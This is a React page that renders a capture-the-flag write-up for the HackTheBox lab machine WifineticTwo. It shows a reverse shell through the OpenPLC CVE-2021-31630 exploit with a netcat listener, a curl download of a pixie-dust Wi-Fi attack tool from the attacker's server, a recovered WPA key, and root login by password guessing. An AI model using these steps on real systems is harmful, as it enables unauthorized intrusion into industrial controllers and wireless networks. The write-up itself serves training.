import { Divider } from "@nextui-org/react";
import HeaderBlog from "@/components/blog/HeaderBlog";
import TableContent from "@/components/blog/TableContent";
import SubHeader from "@/components/blog/SubHeader";
import SubPara from "@/components/blog/SubPara";
import { Code } from "@nextui-org/react";
import SubImage from "@/components/blog/SubImage";
import { Link } from "@nextui-org/react";
import FooterBlog from '@/components/blog/Footer'
import { list_post } from "@/config/post";
export const metadata = {
    title: 'Wifinetictwo',
}
export default function Page() {
    
    
    const findDate = (header: string) => {
        // Check if list_post array exists and has items
        if (list_post && list_post.length > 0) {
            // Iterate through the array
            for (let i = 0; i < list_post.length; i++) {
                const post = list_post[i];
                // Check if the post object has the header property
                if (post && post.header === header) {
                    // Return the header value
                    return post.date;
                }
            }
            // If no header found in any post
            return "Header not found";
        } else {
            // If list_post array is empty or undefined
            return "No posts found";
        }
    };

    const date = findDate('Wifinetic');

    const items = [
        {
            key: 'Introduction',
            label: 'Introduction',
            idx: '#introduction'
        },
        {
            key: 'Enumeration',
            label: 'Enumeration',
            idx: '#enumeration'
        },
        {
            key: 'Exploitation',
            label: 'Exploitation',
            idx: '#exploitation'
        },
        {
            key: 'PrivilegeEscalation',
            label: 'Privilege Escalation',
            idx: '#privilegeescalation'
        }
    ];

    return (
        <div className="mt-3 w-[90%] md:w-4/5 mx-auto">
            <HeaderBlog name="WifinetecTwo" />
            <Divider />
            <TableContent items={items} />
            <div id="introduction" className="my-2">
                <SubHeader item={{ num: '1', content: 'Introduction' }} />
                <SubPara content={'This challenge is from HackTheBox and is rated as medium difficulty. This challenge involves identifying vulnerabilities in OpenPLC and Wi-Fi connections.'} />
            </div>
            <div id="enumeration" className="my-2">
                <SubHeader item={{ num: '2', content: 'Enumeration' }} />
                <SubPara content={'To scan a target machine using the Nmap tool, execute the following command:'} />
                <div className="overflow-x-auto">
                    <Code color="success" >nmap -sV -A -p- --min-rate 1500 &lt;target_machine&gt;</Code>
                </div>
                
                <SubPara content={'Upon scanning, you observe that two ports are open: Port 22 for SSH and Port 8080 for Werkzeug. When accessing http://<target_machine>:8080/, it redirects to /login, indicating the usage of OpenPLC. Scan dir with gobuster by run following command: '} />
                <div className="overflow-x-auto">
                    <Code color="success">gobuster -w /usr/share/dirb/&lt;dirlist&gt; -u &lt;target_host&gt;:8080</Code>
                </div>
                
                <SubImage img={{
                    alt: 'dirsearch',
                    path: '/images/wifinetictwo/dirsearch.png',
                    size: 400
                }} />
                <SubPara content={'No noteworthy discoveries in the results. Access to this service requires authentication. Search the internet for the default credentials: openplc:openplc. Attempt to log in with these credentials. Success! You have successfully logged in. Upon searching for vulnerabilities in OpenPLC on the internet, you can find CVE-2021-31630. Use it for the exploitation'} />
                <Link
                    href={'https://www.exploit-db.com/exploits/49803'}
                    color="warning"
                    underline="hover"
                    target="_blank"
                >See this link</Link>
            </div>
            <div id="exploitation" className="my-2">
                <SubHeader item={{ num: '3', content: 'Exploitation' }} />
                <SubPara content={'Download the Python code provided in the link. However, it currently doesn &apos;t work due to incorrect configurations in the file. You need to make alterations as shown in the image below."'} />
                <SubImage img={{
                    alt: 'config file',
                    path: '/images/wifinetictwo/configfile.png',
                    size: 400
                }} />
                <SubPara content={'In the terminal. Type:'} />
                <Code color="success">nc -lnvp 4444 (can use other port)</Code>
                <SubPara content={'Other terminal.Run exploit code Type: '} />
                <div className="overflow-x-auto">
                    <Code color="success">python 49803 -u http://&lt;host&gt;:8080 -l openplc -p openplc -i 10.10.14.18 -r 4444</Code>
                </div>
                <SubImage img={{
                    alt: 'exploit 1',
                    path: '/images/wifinetictwo/exl1.png',
                    size: 400
                }} />
                <SubImage img={{
                    alt: 'exploit 2',
                    path: '/images/wifinetictwo/exl2.png',
                    size: 400
                }} />
                <div className="overflow-x-auto">
                    <Code color="warning">Completely! User step.</Code>
                </div>
            </div>
            <div id="privilegeescalation" className="my-2">
                <SubHeader item={{ num: '4', content: 'Privilege Escalation' }} />
                <SubPara content={'You can check the network status by using the ifconfig command. If wlan0 is active, it indicates that the Wi-Fi is working. You can exploit this either by conducting a brute-force attack or by using a pixie dust attack. You can clone code from the repo below and build it after that tranfer it to targer server and exploit.'} />
                <SubImage img={{
                    alt: 'exploit 2',
                    path: '/images/wifinetictwo/network.png',
                    size: 400
                }} />
                <Link
                    href={'https://github.com/nikita-yfh/OneShot-C'}
                    color="warning"
                    underline="hover"
                    target="_blank"
                >OneShot-C program</Link>
                <SubPara content={'Run server http at attack machine. '} />
                <div className="overflow-x-auto">
                    <Code color="success">python3 -m http.server 9999</Code>
                </div>
                <SubPara content={'In target machine, get file exec is built from program. and add permission for this!'} />
                <div className="overflow-x-auto">
                    <Code color="success" className="my-3 ">curl http://&lt;attack_machine&gt;:9999/oneshot -O oneshot</Code><br />
                </div>
                <SubPara content={'Run oneshot program.'} />
                <Code color="success" className="my-3">./oneshot -i wlan0 -K</Code>
                <SubImage img={{
                    alt: 'scan 1',
                    path: '/images/wifinetictwo/scan1.png',
                    size: 400
                }} />
                <SubImage img={{
                    alt: 'scan 2',
                    path: '/images/wifinetictwo/scan2.png',
                    size: 400
                }} />
                <SubPara content={'Ok. We have ssid and wpa psk.'} />
                <div className="overflow-x-auto">
                    <Code color="warning">plcrouter:NoWWEDoKnowWhaTisReal123!</Code>
                </div>
                <SubPara content={'Using this cresidential login wifi. You can search internet or ask openai about `using wpa_supplicant connect Wi-Fi.`'} />
                <SubImage img={{
                    alt: 'wifi 1',
                    path: '/images/wifinetictwo/wifi1.png',
                    size: 400
                }} />
                <SubImage img={{
                    alt: 'wifi 2',
                    path: '/images/wifinetictwo/wifi2.png',
                    size: 400
                }} />
                <SubImage img={{
                    alt: 'wifi 3',
                    path: '/images/wifinetictwo/wifi3.png',
                    size: 400
                }} />
                <SubPara content={'Continue and guess. You notice that the SSH service has a weak password setup. You can log in as the root user and retrieve the flag."'} />
                <SubImage img={{
                    alt: 'wifi 4',
                    path: '/images/wifinetictwo/wifi4.png',
                    size: 400
                }} />
                <div className="overflow-x-auto">
                    <Code color="warning" className="my-3">This challenge has been completed</Code>
                </div>
            </div>
            <FooterBlog date={date} />
        </div>
    );
}